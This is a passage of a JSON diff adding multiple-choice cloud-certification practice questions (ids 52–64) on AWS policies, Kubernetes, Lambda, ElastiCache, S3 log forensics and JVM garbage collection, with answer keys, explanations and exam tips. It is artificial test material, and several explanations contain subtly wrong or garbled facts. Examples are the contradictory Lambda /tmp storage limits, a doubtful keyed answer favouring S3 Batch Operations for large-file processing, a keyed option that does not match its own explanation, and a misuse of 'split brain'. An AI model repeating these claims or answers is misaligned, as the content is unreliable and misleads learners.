+      "explanation": "The fundamental problem with this SCP is that it restricts setting public access blocks rather than preventing public access. The Action \"s3:PutBucketPublicAccessBlock\" controls the ability to configure the public access block settings on a bucket, which is actually the security feature that prevents buckets from becoming public. By denying this action, the policy would prevent users from enabling public access blocks, which is the opposite of the intended security control. The policy should instead deny actions that make buckets public (like s3:PutBucketPolicy with public policies or s3:PutBucketACL with public ACLs) or enforce that public access blocks must be enabled. The StringEquals condition as written doesn't make logical sense, as s3:PublicAccessBlockConfiguration isn't a condition key that can be used this way. The resource wildcard is appropriate for an organization-wide policy that should apply to all buckets. Including s3:CreateBucket wouldn't achieve the goal of preventing public buckets, as bucket creation itself isn't the issue—it's the subsequent configuration that makes buckets public.",
+      "examTip": "When reviewing IAM policies for logical errors, pay careful attention to whether the actions being allowed or denied actually align with the intended security outcome—sometimes denying an action can prevent a security control from being applied rather than enforcing it."
+    },
+    {
+      "id": 53,
+      "question": "A cloud engineer is investigating performance issues with a microservices application deployed on Kubernetes. Users report that the application occasionally experiences high latency. The engineer collects the following metrics during both normal operation and during a high-latency period:\n\nNormal Operation:\n```\nContainer CPU: 40-60%\nContainer Memory: 50-70%\nPod Restarts: 0\nAPI Request Latency: 150-200ms\nDatabase Connections: 30-40\nNetwork Throughput: 15-20 Mbps\n```\n\nHigh-Latency Period:\n```\nContainer CPU: 50-70%\nContainer Memory: 55-75%\nPod Restarts: 0\nAPI Request Latency: 2000-5000ms\nDatabase Connections: 35-45\nNetwork Throughput: 18-25 Mbps\n```\n\nThe engineer also examines the container logs and notices the following pattern during high-latency periods:\n\n```\n[2023-05-15 14:20:05.123] [INFO] Processing request for user data\n[2023-05-15 14:20:05.125] [DEBUG] Acquiring connection from pool\n[2023-05-15 14:20:05.126] [DEBUG] Waiting for available connection...\n[2023-05-15 14:20:07.326] [DEBUG] Connection acquired after 2200ms\n[2023-05-15 14:20:07.327] [INFO] Executing database query\n[2023-05-15 14:20:07.455] [INFO] Query completed in 128ms\n```\n\nWhat is the most likely cause of the performance issue?",
+      "options": [
+        "Insufficient CPU resources causing processing delays",
+        "Database connection pool exhaustion leading to connection wait times",
+        "Network congestion between application and database services",
+        "Memory pressure triggering garbage collection pauses"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The logs clearly indicate that the performance issue is caused by database connection pool exhaustion. During high-latency periods, the logs show that acquiring a connection from the pool takes 2200ms (\"Connection acquired after 2200ms\"), while the actual query execution is quite fast at 128ms. This indicates that the application is waiting for available connections rather than experiencing slow query performance. The metrics support this conclusion as well - the API request latency increases dramatically from 150-200ms to 2000-5000ms during high-latency periods, while CPU, memory, and network metrics remain relatively stable with only minor increases. Database connections show a slight increase but likely represent the maximum connections available in the pool. Connection pool exhaustion occurs when all connections in the pool are in use, causing new requests to wait until a connection becomes available. This perfectly explains the observed pattern where request processing is delayed significantly at the connection acquisition step, not during query execution. CPU resources show only a 10% increase during high-latency periods, which wouldn't explain the 10-25x increase in latency. Network congestion would typically show much higher increases in throughput or packet loss, neither of which is evident. Memory pressure leading to garbage collection would typically show memory usage spikes and drops rather than the stable pattern observed.",
+      "examTip": "When troubleshooting microservices performance issues, examine the specific timing of operations in logs—connection acquisition delays are often mistaken for slow queries or processing issues, but they represent a different root cause (pool exhaustion) requiring different remediation strategies like increasing pool size or implementing connection reuse."
+    },
+    {
+      "id": 54,
+      "question": "A cloud administrator manages a multi-tenant SaaS application deployed on AWS. Each tenant's data must be isolated to comply with regulatory requirements. The administrator has implemented the following database architecture:\n\n1. A separate RDS PostgreSQL instance for each tenant\n2. IAM authentication for database access\n3. Encryption at rest using KMS customer managed keys\n4. Private VPC subnet placement with security groups\n5. Automated backups to S3 with 7-day retention\n\nDuring an audit, the security team identifies the following issue with this architecture:\n\n```\nFinding: Cross-tenant data access risk detected\nSeverity: High\nDescription: Application service roles have potential access to multiple tenant databases through shared IAM permissions.\n```\n\nWhat additional control should be implemented to address this finding while maintaining operational efficiency?",
+      "options": [
+        "Implement row-level security within each database to restrict access based on tenant context",
+        "Create separate IAM roles for each tenant with permissions only to specific database resources",
+        "Deploy a proxying layer that enforces tenant context validation before database connections",
+        "Use different KMS encryption keys for each tenant's database with tenant-specific key policies"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Creating separate IAM roles for each tenant with permissions only to specific database resources addresses the finding directly. The audit finding specifically identifies that \"application service roles have potential access to multiple tenant databases through shared IAM permissions\" as the issue. By implementing tenant-specific IAM roles that are scoped to access only the corresponding tenant's database resources, the cross-tenant access risk is mitigated at the authentication and authorization layer. This ensures that even if the application logic has flaws, the IAM permissions boundaries prevent accessing data across tenants. Row-level security would add protection within the database but wouldn't address the IAM-level issue identified in the finding, where the application itself has excess permissions across tenant boundaries. A proxying layer adds complexity and doesn't resolve the underlying IAM permission issue. Different KMS encryption keys for each tenant would help with data separation at rest but wouldn't prevent authenticated access across tenant boundaries, which is the specific issue identified.",
+      "examTip": "When addressing multi-tenant data isolation issues, implement controls at multiple layers with identity and access management being the first line of defense—scoping IAM permissions to specific tenant resources prevents cross-tenant access even if application logic is flawed."
+    },
+    {
+      "id": 55,
+      "question": "A cloud team is troubleshooting an intermittent issue where Kubernetes deployments fail with the following error message:\n\n```\nError creating: pods \"frontend-deployment-6d5f754f6b-\" is forbidden: error looking up service account frontend-sa: serviceaccount \"frontend-sa\" not found\n```\n\nThe team confirms that:\n1. The service account exists when manually checked\n2. The issue occurs only during automated deployments\n3. The problem appears randomly, with most deployments succeeding\n\nThe CI/CD pipeline executes the following commands sequentially:\n\n```bash\n# Step 1: Create namespace if it doesn't exist\nkubectl create namespace app-namespace --dry-run=client -o yaml | kubectl apply -f -\n\n# Step 2: Create service account\nkubectl apply -f kubernetes/service-accounts.yaml\n\n# Step 3: Apply deployments\nkubectl apply -f kubernetes/deployments.yaml\n```\n\nThe relevant portion of service-accounts.yaml is:\n\n```yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: frontend-sa\n  namespace: app-namespace\n```\n\nWhat is the most likely cause of this intermittent issue?",
+      "options": [
+        "Race condition between service account creation and deployment application",
+        "Kubernetes RBAC permissions preventing the CI/CD system from creating service accounts",
+        "Namespace termination and recreation causing temporary resource unavailability",
+        "API server caching stale service account information during high load"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The most likely cause is a race condition between service account creation and deployment application. The error message indicates that the deployment is being created before the service account is fully established in the API server. The steps in the CI/CD pipeline show that the service account creation (Step 2) and deployment application (Step 3) occur sequentially but without any verification that the service account is fully established before proceeding. In Kubernetes, resource creation is asynchronous - the kubectl apply command returns after the request is accepted by the API server, not when the resource is fully propagated through the system. This explains why the issue is intermittent - when system load is low or network conditions are favorable, the service account is fully established before the deployment creation proceeds, but under other conditions, the deployment proceeds before the service account is available. RBAC permission issues would typically result in consistent failures with permission denied errors rather than intermittent \"not found\" errors. Namespace termination isn't indicated in the scenario, and the error specifically references the service account not being found, not the namespace. API server caching would typically affect read operations (like get) rather than create operations that check current state.",
+      "examTip": "When troubleshooting intermittent resource dependency issues in Kubernetes, consider adding explicit verification or wait steps between resource creations in automation pipelines—resource creation is asynchronous, and \"not found\" errors often indicate race conditions rather than permission problems."
+    },
+    {
+      "id": 56,
+      "question": "A cloud engineer implements a data processing pipeline using AWS Step Functions. The workflow processes customer transaction data, with one step that enriches transaction data using a third-party API. During testing, the engineer notices that occasionally the third-party API returns an HTTP 429 (Too Many Requests) error, causing the entire workflow to fail. The relevant portion of the Step Functions state machine definition is shown below:\n\n```json\n{\n  \"Type\": \"Task\",\n  \"Resource\": \"arn:aws:states:::lambda:invoke\",\n  \"Parameters\": {\n    \"FunctionName\": \"arn:aws:lambda:us-east-1:123456789012:function:EnrichTransactionData\",\n    \"Payload\": {\n      \"transaction.$\": \"$.transaction\"\n    }\n  },\n  \"ResultPath\": \"$.enrichedTransaction\",\n  \"Next\": \"ProcessEnrichedData\"\n}\n```\n\nWhat should be added to this task definition to handle the rate limiting errors effectively?",
+      "options": [
+        "Add a Catch configuration that transitions to a Wait state before retrying the same task",
+        "Implement a Circuit Breaker pattern using a Choice state to check for recent failures",
+        "Configure Retry with exponential backoff specifically for States.TaskFailed with ErrorEquals",
+        "Add a Parallel state to execute multiple enrichment requests simultaneously to different endpoints"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Configuring Retry with exponential backoff specifically for the HTTP 429 error is the most effective solution for this scenario. HTTP 429 errors indicate rate limiting by the third-party API, which is typically a temporary condition that can be resolved by waiting and retrying with increasing delays between attempts. The Step Functions Retry field allows specifying exactly which errors should trigger retries (using ErrorEquals), how many times to retry (MaxAttempts), and most importantly, how to implement exponential backoff (BackoffRate and IntervalSeconds). This approach respects the rate limits of the third-party API while maximizing the chance of eventual success without manual intervention. A Catch configuration with a Wait state would work but is more complex than necessary and doesn't implement exponential backoff, which is important for rate limiting scenarios. A Circuit Breaker pattern is designed to prevent overloading failing systems by stopping requests entirely, which isn't appropriate when occasional retries with backoff would succeed. A Parallel state with multiple endpoints would actually increase the rate of API calls, potentially worsening the rate limiting issue rather than solving it.",
+      "examTip": "When handling rate-limiting errors (HTTP 429) in workflow systems, implement exponential backoff retry mechanisms rather than immediate retries or complex fallback patterns—this approach respects API limits while maximizing success probability by intelligently spacing retry attempts with increasing intervals."
+    },
+    {
+      "id": 57,
+      "question": "A cloud engineer is designing a solution for processing large files uploaded by users. The files range from 1GB to 50GB in size and need to be validated, processed, and stored with metadata. The engineer creates the following AWS serverless architecture:\n\n1. API Gateway for upload requests\n2. Lambda function to generate presigned S3 URLs\n3. Direct browser upload to S3 using presigned URLs\n4. S3 event notification to trigger processing Lambda\n5. Processing Lambda that validates and transforms the file\n6. Results stored in S3 with metadata in DynamoDB\n\nDuring testing with large files, the engineer notices that the processing Lambda frequently times out. When examining the Lambda code, they find the following implementation pattern:\n\n```python\ndef lambda_handler(event, context):\n    # Get S3 event details\n    bucket = event['Records'][0]['s3']['bucket']['name']\n    key = event['Records'][0]['s3']['object']['key']\n    \n    # Download file for processing\n    s3_client = boto3.client('s3')\n    local_file = '/tmp/download.dat'\n    s3_client.download_file(bucket, key, local_file)\n    \n    # Process file\n    validation_result = validate_file(local_file)\n    if validation_result['valid']:\n        transformed_file = transform_file(local_file)\n        output_key = f\"processed/{key}\"\n        s3_client.upload_file(transformed_file, bucket, output_key)\n    \n    # Store metadata\n    dynamodb_client = boto3.client('dynamodb')\n    dynamodb_client.put_item(\n        TableName='file_metadata',\n        Item={\n            'file_id': {'S': key},\n            'status': {'S': 'processed' if validation_result['valid'] else 'invalid'},\n            'size': {'N': str(os.path.getsize(local_file))}\n        }\n    )\n    \n    return {\n        'statusCode': 200,\n        'body': json.dumps('Processing complete')\n    }\n```\n\nWhat architectural change should be made to handle the large files efficiently?",
+      "options": [
+        "Increase the Lambda timeout to the maximum 15 minutes and allocate maximum memory",
+        "Modify the Lambda to process the file in streaming mode without downloading it entirely",
+        "Replace the Lambda with a Step Functions workflow that breaks processing into smaller chunks",
+        "Use S3 batch operations with an asynchronous job pattern instead of Lambda processing"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "S3 batch operations with an asynchronous job pattern is the most appropriate solution for processing large files efficiently. The current architecture has several limitations for files in the 1GB-50GB range: Lambda has a maximum execution time of 15 minutes, a /tmp storage limit of 10GB (before December 2022) or 512MB (older runtimes), and downloading/uploading large files within a single function execution is inefficient. S3 batch operations is specifically designed for performing operations on large numbers of S3 objects or large objects, using a job-based approach that handles retries, tracks progress, and provides completion reports. It can invoke a custom function for each object while managing the overall job execution. This approach eliminates the Lambda timeouts, storage constraints, and allows for scalable, resilient processing of large files. Simply increasing the Lambda timeout to 15 minutes wouldn't solve the problem for files that take longer to process or exceed /tmp storage limits. Processing in streaming mode could help with the storage limitation but wouldn't address the timeout issue for very large files. Step Functions with smaller chunks would be complex to implement correctly, requiring careful state management for partial file processing, and would be less efficient than a purpose-built batch processing service.",
+      "examTip": "When designing architectures for processing large files (tens of gigabytes), consider the inherent limitations of serverless functions like execution time caps and storage constraints—purpose-built batch processing services often provide better scalability and reliability than attempting to adapt short-running functions for long-running operations."
+    },
+    {
+      "id": 58,
+      "question": "A cloud team is investigating a potential security breach where unauthorized access to an S3 bucket containing sensitive data may have occurred. They need to determine if any data was exfiltrated and which specific objects were accessed. The bucket has the following configuration:\n\n- Server access logging: Enabled, logs stored in a separate logging bucket\n- CloudTrail data events: Not enabled for this specific bucket\n- Object versioning: Enabled\n- Default encryption: Enabled using SSE-S3\n- VPC endpoint policy: Not configured\n\nThe team collected the following S3 server access log entries (partial sample):\n\n```\n38b8ff5c9488830b547994731aad5b12ea378f21ea8ad9fd95947b8e9b0da425 my-sensitive-bucket [15/Mar/2023:03:45:22 +0000] 203.0.113.42 IAM-User-1 F31A3948CC3122F4 REST.GET.OBJECT customer-data/2023/03/14/transactions.csv \"GET /customer-data/2023/03/14/transactions.csv HTTP/1.1\" 200 - 357 1048576 80 79 \"-\" \"aws-cli/2.9.19 Python/3.9.16 Linux/5.15.0-1031-aws botocore/2.4.5\" - KMS87dyLHXjdcx+GfRR3YBr9ESKMqCXw08XVQyTlX43qf/lOXeCN05Sdb2zn65PHJSLHTw+f0GxP5JHgOQvtPQ9XVQ5+eJ+U= SigV4 ECDHE-RSA-AES128-GCM-SHA256 AuthHeader my-sensitive-bucket.s3.amazonaws.com TLSv1.2 -\n\n38b8ff5c9488830b547994731aad5b12ea378f21ea8ad9fd95947b8e9b0da425 my-sensitive-bucket [15/Mar/2023:03:46:15 +0000] 203.0.113.42 IAM-User-1 C4D82746081D7B73 REST.GET.OBJECT customer-data/2023/03/14/accounts.csv \"GET /customer-data/2023/03/14/accounts.csv HTTP/1.1\" 200 - 412 2097152 95 94 \"-\" \"aws-cli/2.9.19 Python/3.9.16 Linux/5.15.0-1031-aws botocore/2.4.5\" - uf9T4dKP2/RY+Z8AcojRQugXhjHxM3O/oQRIRYmqS4PjFXoxSSnqJrLNBhOCLcqoJjVQV5Y94WGAgvuPsJ+eTK8aA4PgZGQ1= SigV4 ECDHE-RSA-AES128-GCM-SHA256 AuthHeader my-sensitive-bucket.s3.amazonaws.com TLSv1.2 -\n\n38b8ff5c9488830b547994731aad5b12ea378f21ea8ad9fd95947b8e9b0da425 my-sensitive-bucket [15/Mar/2023:03:50:09 +0000] 203.0.113.42 IAM-User-1 G3I91KQSH35JVD9 REST.GET.BUCKET - \"GET /?list-type=2&max-keys=1000&prefix=customer-data/2023/ HTTP/1.1\" 200 - 954 - 35 34 \"-\" \"aws-cli/2.9.19 Python/3.9.16 Linux/5.15.0-1031-aws botocore/2.4.5\" - gn4K2Qw9SmE9YMf78MrFnJ788t8TrG0iLDmUWCB/JpbQKzSgHTFVKyVQzP/xOCrbUoFr+P12xPh1M4uaR7GD5w== SigV4 ECDHE-RSA-AES128-GCM-SHA256 AuthHeader my-sensitive-bucket.s3.amazonaws.com TLSv1.2 -\n```\n\nBased on these log entries, which conclusion can be drawn about the potential data exfiltration?",
+      "options": [
+        "No data exfiltration can be confirmed as all access was authenticated with valid credentials",
+        "Data exfiltration occurred with approximately 3MB of data downloaded from two specific files",
+        "A listing operation was performed but no evidence shows actual object content was accessed",
+        "Data access originated from an unusual IP address but no content was successfully downloaded"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The log entries clearly show data exfiltration occurred with approximately 3MB of data downloaded from two specific files. The logs contain successful GET.OBJECT operations (HTTP status 200) for two files: transactions.csv and accounts.csv. The logs show the number of bytes sent to the requester: 1048576 bytes (1MB) for transactions.csv and 2097152 bytes (2MB) for accounts.csv, totaling approximately 3MB of data. The request pattern shows a systematic approach: listing the bucket contents with a specific prefix (customer-data/2023/) followed by retrieving specific files. The user agent string indicates the AWS CLI was used, suggesting a programmatic access pattern. While the access used valid credentials (IAM-User-1), this doesn't mean the access was authorized or legitimate, especially given the investigation context. The statement that no data exfiltration can be confirmed is incorrect, as the logs clearly show successful downloads of object content. The claim that only listing was performed is contradicted by the GET.OBJECT operations. The logs don't provide information about whether the source IP is unusual, and the HTTP 200 status codes confirm successful downloads.",
+      "examTip": "When analyzing S3 access logs for security investigations, focus on the operation type (GET.OBJECT vs. LIST), HTTP status code (200 indicates success), and bytes sent field—these together confirm whether actual data content was successfully accessed rather than just metadata operations."
+    },
+    {
+      "id": 59,
+      "question": "A cloud architect is designing a new architecture for a distributed application that processes financial transactions. The application needs to maintain strong data consistency while handling high throughput and providing fault tolerance. After evaluating various database options, the architect proposes the following architecture:\n\n1. A multi-node database cluster using a consensus-based replication protocol\n2. Synchronous replication for committed transactions across availability zones\n3. Asynchronous replication to a secondary region for disaster recovery\n4. Read replicas for scaling read traffic with eventual consistency guarantees\n\nDuring the design review, the team must evaluate potential failure scenarios. Which situation would cause this architecture to violate the strong consistency requirement for transaction processing?",
+      "options": [
+        "A network partition occurs between availability zones within the primary region",
+        "One of the read replicas experiences a 5-minute replication lag due to high load",
+        "The application directs writes to the primary region but reads from the disaster recovery region",
+        "A single node within the database cluster becomes unresponsive during a transaction"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "The scenario where the application directs writes to the primary region but reads from the disaster recovery region would violate the strong consistency requirement. The architecture specifies that replication to the secondary (disaster recovery) region is asynchronous, meaning there's an inherent delay between when a transaction is committed in the primary region and when it becomes visible in the secondary region. If the application writes to the primary but reads from the DR region, it could read stale data that doesn't reflect recent writes, thereby violating strong consistency requirements. This pattern is known as a \"split brain\" access pattern where writes and reads target different replicas with different consistency guarantees. A network partition between availability zones within the primary region wouldn't necessarily violate consistency because the consensus-based replication protocol is designed to maintain consistency during such partitions, typically by requiring a quorum of nodes to commit transactions. Read replicas with replication lag affect only read operations explicitly directed to those replicas, not the core transaction processing path that requires strong consistency. A single unresponsive node in the cluster shouldn't affect consistency as consensus-based protocols are designed to tolerate individual node failures while maintaining consistent state across the remaining nodes.",
+      "examTip": "When designing for strong consistency in distributed database architectures, pay particular attention to cross-region access patterns—asynchronous replication between regions means that applications reading from a remote region immediately after writing to the primary region will likely see stale data, violating strong consistency requirements."
+    },
+    {
+      "id": 60,
+      "question": "A DevOps engineer is implementing a CI/CD pipeline for a cloud-native application. The pipeline needs to ensure that infrastructure changes are tested before deployment to production. The team decides to use automated testing with the following requirements:\n\n1. Validate that infrastructure code creates resources with proper configuration\n2. Confirm that security controls are properly implemented\n3. Verify that resources can communicate as expected\n4. Ensure compliance with organizational policies\n\nWhich testing approach provides the most comprehensive validation while minimizing the risk of affecting production environments?",
+      "options": [
+        "Static code analysis of infrastructure code combined with policy-as-code validation",
+        "Unit testing of Terraform modules with mocked provider APIs",
+        "Creating temporary environments for integration testing followed by controlled cleanup",
+        "Incremental deployment to production with automated rollback on monitoring alerts"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Creating temporary environments for integration testing followed by controlled cleanup provides the most comprehensive validation while minimizing production risk. This approach, often called \"ephemeral environment testing,\" creates actual cloud resources in an isolated environment that mirrors production, allowing for true verification of resource creation, configuration, security controls, and communication capabilities. By testing with real resources rather than simulations, it catches issues that might not be apparent in theoretical analysis or mocked testing, such as API behavior differences, performance characteristics, and actual communication patterns between resources. The controlled cleanup ensures that test resources don't persist unnecessarily, minimizing costs and resource waste. Static code analysis and policy-as-code validation are valuable but can only detect issues visible in the code itself, not runtime behavior or integration issues that emerge when resources interact. Unit testing with mocked provider APIs doesn't validate actual resource provisioning or communication, as it substitutes real API calls with simulated responses. Incremental deployment to production with rollback introduces risk to the production environment, contrary to the requirement of minimizing production impact.",
+      "examTip": "When testing infrastructure as code changes, balance comprehensiveness against production risk by implementing ephemeral environment testing—temporary environments provide real-world validation with actual resources while keeping testing isolated from production workloads."
+    },
+    {
+      "id": 61,
+      "question": "A cloud engineer is deploying a high-performance web application on AWS using Amazon ElastiCache Redis for session state management. Before going to production, they perform load testing and notice significantly higher latency than expected when the application needs to retrieve session data. The Redis cluster is configured as follows:\n\n- Node type: cache.m5.large (2 vCPU, 6.38 GiB memory)\n- Number of nodes: 2 (1 primary, 1 replica)\n- Network: Placed in the same VPC, different AZ from application servers\n- Security: Redis AUTH enabled, in-transit encryption enabled\n- Parameter group: default.redis6.x\n\nDuring testing, the engineer collects the following Redis metrics:\n\n- CPU Utilization: 15-20%\n- Memory usage: 35-40%\n- CacheHits: 3,000/minute\n- CacheMisses: 50/minute\n- NetworkBandwidth: 25 MBps (out of 593 MBps available)\n- Replication Lag: 5ms average\n\nAnalyzing the application logs, they observe the following pattern for each session data retrieval:\n\n```\n[INFO] [2023-05-28 15:30:45.123] Getting session data for user 12345\n[DEBUG] [2023-05-28 15:30:45.124] Opening connection to Redis\n[DEBUG] [2023-05-28 15:30:45.224] Connection established after 100ms\n[DEBUG] [2023-05-28 15:30:45.225] Sending AUTH command\n[DEBUG] [2023-05-28 15:30:45.227] AUTH successful\n[DEBUG] [2023-05-28 15:30:45.228] Sending GET command for session:12345\n[DEBUG] [2023-05-28 15:30:45.230] Received session data (2KB) in 2ms\n[DEBUG] [2023-05-28 15:30:45.231] Closing Redis connection\n[INFO] [2023-05-28 15:30:45.232] Session data retrieved in 109ms\n```\n\nWhat is the most effective change to improve the application's performance with ElastiCache?",
+      "options": [
+        "Increase the number of Redis replicas to distribute read operations",
+        "Upgrade to a larger cache node type with more CPU and memory resources",
+        "Implement connection pooling in the application instead of creating new connections per request",
+        "Enable cluster mode with hash slots to distribute keys across multiple nodes"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Implementing connection pooling in the application would be the most effective change to improve performance. The application logs clearly show that most of the latency (100ms out of 109ms total) is spent establishing a new Redis connection for each request. The pattern shows connections being opened and closed for each session retrieval rather than being reused, with the actual data retrieval taking only 2ms once the connection is established. Connection pooling would maintain a set of pre-established connections that can be reused across requests, eliminating the connection establishment overhead for subsequent requests. The Redis metrics indicate that resource utilization is low (15-20% CPU, 35-40% memory, 25 MBps network) and performance is good once connected (2ms for the actual GET operation), suggesting that the cluster itself isn't the bottleneck. Increasing the number of replicas wouldn't help since the issue isn't read throughput (cache hits are high relative to misses) but rather connection establishment overhead. Upgrading to a larger node type wouldn't address the connection overhead that dominates the latency. Enabling cluster mode would redistribute keys but wouldn't solve the connection establishment overhead that's clearly the primary issue.",
+      "examTip": "When troubleshooting cache performance issues, analyze the complete request lifecycle including connection establishment—high latency despite low cache resource utilization often indicates client-side connection management issues rather than cache capacity problems."
+    },
+    {
+      "id": 62,
+      "question": "A company is implementing an automated solution for managing cloud resources across multiple AWS accounts. The solution needs to regularly scan all accounts for non-compliant resources and automatically remediate specific compliance violations. The architecture team proposes the following design:\n\n```\n┌────────────────┐    ┌────────────────┐    ┌───────────────────┐\n│                │    │                │    │                   │\n│ AWS Config     ├────► EventBridge    ├────► Step Functions    │\n│                │    │                │    │                   │\n└────────────────┘    └────────────────┘    └─────────┬─────────┘\n                                                      │\n┌────────────────┐    ┌────────────────┐             │\n│                │    │                │             │\n│ DynamoDB       │◄───┤ Lambda         │◄────────────┘\n│                │    │                │\n└────────────────┘    └────────────────┘\n```\n\nThe solution works as follows:\n1. AWS Config detects non-compliant resources and generates compliance events\n2. EventBridge routes these events to a Step Functions state machine\n3. Step Functions orchestrates the remediation workflow\n4. Lambda functions perform the actual remediation actions\n5. DynamoDB tracks the remediation status and history\n\nWhich component in this design creates a potential single point of failure for cross-account remediation?",
+      "options": [
+        "AWS Config rules implementation varies between accounts",
+        "EventBridge doesn't support cross-account event routing natively",
+        "Step Functions lacks appropriate IAM permissions for cross-account actions",
+        "Lambda execution role permissions are limited to the function's account"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "The Lambda execution role permissions being limited to the function's account creates a single point of failure for cross-account remediation. Lambda functions execute with the permissions granted by their execution role, which by default can only perform actions within the account where the Lambda function is deployed. For cross-account remediation, the Lambda functions would need explicit permissions to access and modify resources in other accounts, typically through cross-account roles and AssumeRole operations. Without this capability properly configured, the Lambda functions would be unable to perform remediation actions in accounts other than their own, breaking the cross-account remediation workflow. AWS Config can be standardized across accounts using organizational rules, avoiding account-specific variations. EventBridge does support cross-account event routing through both native cross-account event buses and organization event buses, so this isn't a limitation. Step Functions can orchestrate cross-account workflows by invoking Lambda functions with the appropriate permissions or by assuming cross-account roles itself, but it ultimately depends on the execution permissions of the services it invokes, which in this case are the Lambda functions.",
+      "examTip": "When designing cross-account automation solutions, pay particular attention to the execution context of services that perform the actual resource modifications—Lambda functions in particular require explicit cross-account access permissions through role assumption or resource policies to modify resources outside their own account."
+    },
+    {
+      "id": 63,
+      "question": "A cloud team must implement a solution for securely sharing large files (1-10GB) with external business partners. The requirements include:\n\n1. Files must be encrypted in transit and at rest\n2. Access must be time-limited (typically 7 days)\n3. Downloads must be logged for audit purposes\n4. No permanent credentials should be shared with partners\n5. Partners should not need to install special software\n\nThe team is considering the following implementation in AWS:\n\n```terraform\nresource \"aws_s3_bucket\" \"file_sharing\" {\n  bucket = \"company-file-sharing\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"file_sharing\" {\n  bucket = aws_s3_bucket.file_sharing.id\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"file_sharing\" {\n  bucket = aws_s3_bucket.file_sharing.id\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}\n\nresource \"aws_cloudtrail\" \"s3_data_events\" {\n  name           = \"s3-data-events\"\n  s3_bucket_name = aws_s3_bucket.cloudtrail_logs.id\n  event_selector {\n    read_write_type           = \"All\"\n    include_management_events = false\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"${aws_s3_bucket.file_sharing.arn}/\"]\n    }\n  }\n}\n```\n\nWhat essential component is missing from this implementation to meet the requirements?",
+      "options": [
+        "S3 bucket versioning to prevent accidental file deletion or overwrites",
+        "S3 bucket lifecycle rules to automatically delete files after the sharing period",
+        "Lambda function to generate presigned URLs with expiration for temporary access",
+        "S3 bucket CORS configuration to allow browser-based uploads from partners"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "A Lambda function to generate presigned URLs with expiration for temporary access is the essential missing component. The requirements specify that access must be time-limited (typically 7 days) and no permanent credentials should be shared with partners. Presigned URLs are the AWS S3 mechanism that satisfies both these requirements by providing temporary, time-limited access to specific objects without requiring AWS credentials or special software. The implementation shows proper encryption configuration (server-side encryption with AES256), public access blocking for security, and CloudTrail logging for audit requirements, but lacks the critical mechanism for granting the temporary access to external partners. S3 bucket versioning would help with data protection but doesn't address the temporary access requirement. Lifecycle rules for automatic deletion would help with cleanup but don't provide the mechanism for secure sharing with temporary access. CORS configuration enables browser-based operations but doesn't solve the temporary access requirement and would be insufficient alone for sharing with external partners who need to access files without AWS credentials.",
+      "examTip": "When designing secure file sharing solutions in the cloud, prioritize mechanisms that provide temporary, scoped access without permanent credential sharing—presigned URLs (or equivalent temporary token systems in other cloud providers) are typically the most appropriate solution for temporary external access to specific resources."
+    },
+    {
+      "id": 64,
+      "question": "A cloud engineer is investigating performance issues with a containerized application deployed in Kubernetes. Users report that the application becomes unresponsive for short periods and then recovers. The engineer examines the following container logs:\n\n```\n2023-05-22T14:30:15.456Z INFO  [app] Processing request 45678\n2023-05-22T14:30:15.789Z INFO  [app] Request 45678 completed in 330ms\n2023-05-22T14:30:16.123Z INFO  [app] Processing request 45679\n2023-05-22T14:30:16.423Z INFO  [app] Request 45679 completed in 300ms\n2023-05-22T14:31:02.789Z INFO  [gc] [GC (Allocation Failure) [PSYoungGen: 1048576K->87331K(1835008K)] 1048576K->87339K(2883584K), 0.1194200 secs] [Times: user=0.32 sys=0.04, real=0.12 secs]\n2023-05-22T14:31:02.912Z INFO  [app] Processing request 45680\n2023-05-22T14:31:03.234Z INFO  [app] Request 45680 completed in 322ms\n...\n2023-05-22T14:35:45.678Z INFO  [app] Processing request 45782\n2023-05-22T14:35:45.987Z INFO  [app] Request 45782 completed in 309ms\n2023-05-22T14:35:47.123Z INFO  [gc] [GC (Allocation Failure) [PSYoungGen: 1048576K->103453K(1835008K)] 1048576K->103461K(2883584K), 0.1104800 secs] [Times: user=0.29 sys=0.05, real=0.11 secs]\n2023-05-22T14:35:47.237Z INFO  [app] Processing request 45783\n2023-05-22T14:35:47.546Z INFO  [app] Request 45783 completed in 309ms\n...\n2023-05-22T14:40:15.234Z INFO  [app] Processing request 45860\n2023-05-22T14:40:15.567Z INFO  [app] Request 45860 completed in 333ms\n2023-05-22T14:40:16.789Z INFO  [gc] [Full GC (Ergonomics) [PSYoungGen: 1310720K->0K(1835008K)] [ParOldGen: 920531K->831960K(1048576K)] 2231251K->831960K(2883584K), [Metaspace: 89734K->89734K(1128448K)], 4.3715200 secs] [Times: user=10.12 sys=0.42, real=4.37 secs]\n2023-05-22T14:40:21.123Z INFO  [app] Processing request 45861\n2023-05-22T14:40:21.456Z INFO  [app] Request 45861 completed in 333ms\n```\n\nThe container is allocated 3GB of memory and is running a Java application with the following JVM arguments:\n\n```\n-Xms2g -Xmx2g -XX:+UseParallelGC -XX:GCTimeRatio=99 -XX:+DisableExplicitGC\n```\n\nWhat is the most likely cause of the application becoming unresponsive?",
+      "options": [
+        "Network latency spikes between the user and the application",
+        "Container CPU throttling due to exceeding resource limits",
+        "JVM full garbage collection pauses stopping application threads",
+        "Database connection pool exhaustion during peak request periods"
+      ],
+      "correctAnswerIndex": 2,
